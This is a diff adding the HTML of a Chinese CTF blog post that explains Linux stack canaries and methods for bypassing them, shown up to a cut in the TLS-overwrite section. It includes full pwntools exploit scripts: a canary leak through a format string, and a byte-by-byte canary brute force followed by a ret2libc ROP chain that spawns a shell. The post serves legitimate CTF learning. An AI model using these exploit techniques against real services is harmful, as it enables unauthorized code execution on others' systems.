@@ -1,0 +1,479 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CTF-pwn 技术总结（3） | 爱玩且很菜</title><meta name="keywords" content="PWN,linux"><meta name="author" content="pyh"><meta name="copyright" content="pyh"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CTF-pwn 技术总结（3）学习linux pwn，linux安全机制的知识是绕不开的。如果能理解这些安全机制的原理以及不懂得如何绕过它们，那么在比赛时将你举步维艰，本节我就总结了所有linux安全机制的基本原理以及具体的绕过方法，希望能帮助一些小萌新更快入门，帮助需要进阶的朋友打好根基。 linux安全机制详解与绕过一、Stack canaryStack canary（取名自地下煤矿的金丝雀，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF-pwn 技术总结（3）">
+<meta property="og:url" content="http://example.com/2022/02/01/CTF-pwn-%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%883%EF%BC%89/index.html">
+<meta property="og:site_name" content="爱玩且很菜">
+<meta property="og:description" content="CTF-pwn 技术总结（3）学习linux pwn，linux安全机制的知识是绕不开的。如果能理解这些安全机制的原理以及不懂得如何绕过它们，那么在比赛时将你举步维艰，本节我就总结了所有linux安全机制的基本原理以及具体的绕过方法，希望能帮助一些小萌新更快入门，帮助需要进阶的朋友打好根基。 linux安全机制详解与绕过一、Stack canaryStack canary（取名自地下煤矿的金丝雀，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/wallhaven-o3wzql.jpg">
+<meta property="article:published_time" content="2022-02-01T01:55:02.000Z">
+<meta property="article:modified_time" content="2022-02-02T11:48:24.905Z">
+<meta property="article:author" content="pyh">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="linux">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/wallhaven-o3wzql.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/02/01/CTF-pwn-%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%883%EF%BC%89/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?var _hmt = _hmt || []; (function() { var hm = document.createElement("script"); hm.src = "https://hm.baidu.com/hm.js?1edf852d28f0a2b88704ac1412f5bb44"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CTF-pwn 技术总结（3）',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-02-02 19:48:24'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/1580288142723622.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">32</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">17</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清單</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音樂</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 電影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友鏈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 關於</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/wallhaven-o3wzql.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">爱玩且很菜</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清單</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音樂</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 電影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友鏈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 關於</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CTF-pwn 技术总结（3）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-02-01T01:55:02.000Z" title="发表于 2022-02-01 09:55:02">2022-02-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-02-02T11:48:24.905Z" title="更新于 2022-02-02 19:48:24">2022-02-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/">PWN</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/linux/">linux</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CTF-pwn 技术总结（3）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="CTF-pwn-技术总结（3）"><a href="#CTF-pwn-技术总结（3）" class="headerlink" title="CTF-pwn 技术总结（3）"></a>CTF-pwn 技术总结（3）</h1><p>学习linux pwn，linux安全机制的知识是绕不开的。如果能理解这些安全机制的原理以及不懂得如何绕过它们，那么在比赛时将你举步维艰，本节我就总结了所有linux安全机制的基本原理以及具体的绕过方法，希望能帮助一些小萌新更快入门，帮助需要进阶的朋友打好根基。</p>
+<h2 id="linux安全机制详解与绕过"><a href="#linux安全机制详解与绕过" class="headerlink" title="linux安全机制详解与绕过"></a>linux安全机制详解与绕过</h2><h3 id="一、Stack-canary"><a href="#一、Stack-canary" class="headerlink" title="一、Stack canary"></a>一、Stack canary</h3><p><strong>Stack canary</strong>（取名自地下煤矿的金丝雀，因为它能比矿工更早发现煤气泄漏，有预警作用）是一种用于对抗栈溢出攻击的技术，有时也叫做 <strong>Stack cookie</strong> 。canary的值是栈上的一个随机数，在程序启动时随机生成并保存在比函数返回地址更低的位置。由于栈溢出是从低地址向高地址进行覆盖，因此攻击者要想控制函数的返回指针，就一定要先覆盖到Canary。程序只需要在函数返回前检查Canary是否被篡改，就可以达到保护栈的目的。</p>
+<p>可以在 GCC 中使用以下参数设置 Canary:</p>
+<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">-fstack-protector 为内部缓冲区大于8字节的函数插入保护</span></span><br><span class="line"><span class="deletion">-fstack-protector-all 为所有函数插入保护</span></span><br><span class="line"><span class="deletion">-fstack-protector-strong 增加对包含局部数组定义和地址引用的函数的保护</span></span><br><span class="line"><span class="deletion">-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护</span></span><br><span class="line"><span class="deletion">-fno-stack-protector 禁用保护</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>关闭canary：</p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220201102419146.png" alt="image-20220201102419146"></p>
+<p>开启canary：</p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220201102707231.png" alt="image-20220201102707231"></p>
+<p>可以发现开启canary后，程序终止并抛出错误 “stack smahing detected”，表示检测到了栈溢出</p>
+<p>其反汇编代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; disassemble main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00000000004005b6 &lt;+0&gt;:		push   rbp</span><br><span class="line">   0x00000000004005b7 &lt;+1&gt;:		mov    rbp,rsp</span><br><span class="line">   0x00000000004005ba &lt;+4&gt;:		sub    rsp,0x20</span><br><span class="line">   0x00000000004005be &lt;+8&gt;:		mov    rax,QWORD PTR fs:0x28  ----取出随机生成的canary</span><br><span class="line">   0x00000000004005c7 &lt;+17&gt;:	mov    QWORD PTR [rbp-0x8],rax ---将canary安放在栈上</span><br><span class="line">   0x00000000004005cb &lt;+21&gt;:	xor    eax,eax</span><br><span class="line">   0x00000000004005cd &lt;+23&gt;:	lea    rax,[rbp-0x20]</span><br><span class="line">   0x00000000004005d1 &lt;+27&gt;:	mov    rsi,rax</span><br><span class="line">   0x00000000004005d4 &lt;+30&gt;:	mov    edi,0x400684</span><br><span class="line">   0x00000000004005d9 &lt;+35&gt;:	mov    eax,0x0</span><br><span class="line">   0x00000000004005de &lt;+40&gt;:	call   0x4004a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x00000000004005e3 &lt;+45&gt;:	nop</span><br><span class="line">   0x00000000004005e4 &lt;+46&gt;:	mov    rax,QWORD PTR [rbp-0x8] ---取出栈上的值</span><br><span class="line">   0x00000000004005e8 &lt;+50&gt;:	xor    rax,QWORD PTR fs:0x28   ---与生成的canary进行比较</span><br><span class="line">   0x00000000004005f1 &lt;+59&gt;:	je     0x4005f8 &lt;main+66&gt;	---相等程序继续执行</span><br><span class="line">   0x00000000004005f3 &lt;+61&gt;:	call   0x400480 &lt;__stack_chk_fail@plt&gt; ---不相等进入处理函数</span><br><span class="line">   0x00000000004005f8 &lt;+66&gt;:	leave  </span><br><span class="line">   0x00000000004005f9 &lt;+67&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+
+<p>注意标有注释的部分。对于64位程序，在开始运行时，就会随机生成canary，存放在 <strong>TLS结构体 tcbhead_t</strong> 偏移为 <strong>0x28</strong> 的位置，带有缓冲区的函数在函数开头就会利于 <strong>FS指针</strong> 从该位置取出canary的值将其置于 <strong>rbp-0x8</strong> 的位置，在函数返回时，就会比较 <strong>FS[0x28]</strong> 里原本的canary和栈上的canary，若相等，程序继续向下执行；若不相等，进入处理栈溢出的函数—— <strong>stack_chk_fail</strong>,它会让程序终止并且抛出报错 “stack smahing detected”。</p>
+<p>对于32位程序，canary变成了 <strong>gs寄存器偏移0x14</strong> 的地方。</p>
+<h4 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h4><p>我们可以通过checksec检测程序是否开启canary：</p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220201105114184.png" alt="image-20220201105114184"></p>
+<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>canary保护机制是所有linux保护机制中绕过方法最多的一种保护机制，下面给出常用的几种绕过方法：</p>
+<p><strong>1、泄露canary</strong></p>
+<p><strong>2、劫持_stack_chk_fail函数</strong></p>
+<p><strong>3、爆破canary</strong></p>
+<p><strong>4、覆盖TLS中储存的canary值</strong></p>
+<p><strong>5、SSP leak 攻击</strong></p>
+<hr>
+<h3 id="1-泄露canary"><a href="#1-泄露canary" class="headerlink" title="1.泄露canary"></a>1.泄露canary</h3><p>利用现有漏洞泄露出canary的值，然后再构造ROP链</p>
+<h4 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h4><p><strong>来自攻防世界—Mary_Morton</strong></p>
+<p> 64位的程序，并且开启了NX和Canary：</p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220201112017967.png" alt="image-20220201112017967"></p>
+<p>执行一下文件看看流程，存在两个漏洞：</p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/1232423kasfd.png" alt="1232423kasfd"></p>
+<p>ida查看伪代码：</p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220201111832367.png" alt="image-20220201111832367"></p>
+<p>存在格式化字符串漏洞：</p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220201112249535.png" alt="image-20220201112249535"></p>
+<p>存在栈溢出漏洞：</p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220201112333285.png" alt="image-20220201112333285"></p>
+<p>还存在一个后门函数：</p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220201112534968.png" alt="image-20220201112534968"></p>
+<h5 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h5><p>先利用上一节所讲的格式化字符串泄露出canary的值，再利用栈溢出漏洞带上canary覆盖返回地址为后门函数。</p>
+<h5 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">59339</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;3. Exit the battle&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;%23$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;canary: &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">backdoor=<span class="number">0x4008da</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(canary) +<span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(backdoor)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;3. Exit the battle&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-劫持-stack-chk-fail函数"><a href="#2-劫持-stack-chk-fail函数" class="headerlink" title="2.劫持_stack_chk_fail函数"></a>2.劫持_stack_chk_fail函数</h3><p>已知 canary 失败的处理逻辑会进入到 <code>__stack_chk_fail</code> 函数，<code>__stack_chk_fail</code> 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。</p>
+<h4 id="例题：-1"><a href="#例题：-1" class="headerlink" title="例题："></a>例题：</h4><p><strong>ZCTF2017 —Login</strong></p>
+<p>演示参考：<a target="_blank" rel="noopener" href="https://futurehacker.tech/archives/pwn-zctf2017-login">https://futurehacker.tech/archives/pwn-zctf2017-login</a></p>
+<h3 id="3-爆破canary"><a href="#3-爆破canary" class="headerlink" title="3.爆破canary"></a>3.爆破canary</h3><p>对于 canary，虽然每次进程重启后的 Canary 不同，但是同一个进程中的不同线程的 canary 是相同的， 并且通过 fork 函数创建的子进程的 canary 也是相同的，因为 fork 函数会直接拷贝父进程的内存。我们可以利用这样的特点，彻底逐个字节将 canary 爆破出来。</p>
+<h4 id="例题：-2"><a href="#例题：-2" class="headerlink" title="例题："></a>例题：</h4><p><strong>2017湖湘杯—pwn100</strong> </p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220201114714626.png" alt="image-20220201114714626"></p>
+<p>main函数：</p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220201115234778.png" alt="image-20220201115234778"></p>
+<p>跟进sub_8048B29()，</p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220201115725938.png" alt="image-20220201115725938"></p>
+<p>继续跟进，</p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220201115406337.png" alt="image-20220201115406337"></p>
+<p>分析可以知道这里就是base64解密算法：</p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220201115553138.png" alt="image-20220201115553138"></p>
+<p>找到输入点，可以看到最大可以输入0x200（512）字节的数据，对于输入格式的要求是能够进行base64解码：</p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220201115815546.png" alt="image-20220201115815546"></p>
+<h5 id="思路：-1"><a href="#思路：-1" class="headerlink" title="思路："></a>思路：</h5><p>base64解码的结果存入char数组v21[257],base64解码之后的数据大小大概是原来的3/4，足够造成栈溢出了。本题难点在于canary，由于程序通过 <code>fork()</code> 创建子进程，所以想到了爆破canary，这是个32位的程序，所以canary有4个字节，最低位一定是\x00，所以只需要爆破三个字节即可。</p>
+<p><strong>爆破代码：</strong></p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="selector-tag">p</span><span class="selector-class">.recvuntil</span>(<span class="string">&#x27;May be I can know if you give me some data[Y/N]\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">        <span class="selector-tag">p</span><span class="selector-class">.send</span>(<span class="string">&#x27;Y\n&#x27;</span>)</span><br><span class="line">        <span class="selector-tag">p</span><span class="selector-class">.send</span>(b64encode(<span class="string">&#x27;a&#x27;</span>*<span class="number">257</span>+ canary + chr(j)))</span><br><span class="line">        recv =<span class="selector-tag">p</span><span class="selector-class">.recvuntil</span>(<span class="string">&#x27;May be I can know if you give me some data[Y/N]\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Finish&#x27;</span> <span class="keyword">in</span> recv:</span><br><span class="line">            canary += chr(j)</span><br><span class="line">            break</span><br><span class="line">print <span class="string">&#x27;find canary:&#x27;</span>+canary<span class="selector-class">.encode</span>(<span class="string">&#x27;hex&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>得到canary后，再次返回输入处，构造ROP泄露libc基址，最后再回到一次输入处，构造ROP来getshell。</p>
+<h5 id="EXP：-1"><a href="#EXP：-1" class="headerlink" title="EXP："></a>EXP：</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwns&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;pwns&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">vulc_addr = <span class="number">0x080487E6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># brute</span></span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;May be I can know if you give me some data[Y/N]\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        p.send(<span class="string">&#x27;Y\n&#x27;</span>)</span><br><span class="line">        p.send(b64encode(<span class="string">&#x27;a&#x27;</span>*<span class="number">257</span>+ canary + <span class="built_in">chr</span>(j)))</span><br><span class="line">        recv =p.recvuntil(<span class="string">&#x27;May be I can know if you give me some data[Y/N]\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Finish&#x27;</span> <span class="keyword">in</span> recv:</span><br><span class="line">            canary += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">success(<span class="string">&#x27;find canary:&#x27;</span> + canary.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">257</span> + canary +<span class="string">&#x27;a&#x27;</span>*<span class="number">12</span> + p32(puts_plt) + p32(vulc_addr) + p32(puts_got)</span><br><span class="line">p.send(<span class="string">&#x27;Y\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Give me some datas:\n\n&#x27;</span>)</span><br><span class="line">p.send(b64encode(payload))</span><br><span class="line">puts = u32(p.recv()[<span class="number">268</span>:<span class="number">268</span>+<span class="number">4</span>])</span><br><span class="line">success(<span class="string">&quot;puts: &quot;</span> + <span class="built_in">hex</span>(puts))</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc.so.6&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc_base = puts - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">success(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&#x27;Y\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Give me some datas:\n\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">257</span>+canary+ <span class="string">&#x27;a&#x27;</span>*<span class="number">12</span> + p32(sys) + p32(vulc_addr) + p32(binsh)</span><br><span class="line">p.send(b64encode(payload))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-覆盖TLS中储存的canary值"><a href="#4-覆盖TLS中储存的canary值" class="headerlink" title="4.覆盖TLS中储存的canary值"></a>4.覆盖TLS中储存的canary值</h3><p>canary是存储在TLS中的，函数返回前会使用这个值进行对比，当栈溢出空间较大时，我们同时覆盖栈上存储的canary和TLS储存的canary实现绕过</p>
+<p><strong>知识点：在gdb里使用 <code>fsbase</code> 命令可以找到TLS结构体的地址</strong></p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220201135120817.png" alt="image-20220201135120817"></p>
+<h4 id="例题：-3"><a href="#例题：-3" class="headerlink" title="例题："></a>例题：</h4><p><strong>某高校校赛题</strong></p>
+<p>本题是一个64位程序，题目给了libc版本2.31</p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220201134454132.png" alt="image-20220201134454132"></p>
+<p>main函数创建了一个子进程——test_thread:</p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220201134651767.png" alt="image-20220201134651767"></p>
+<p>大量栈溢出，但是存在canary：</p>
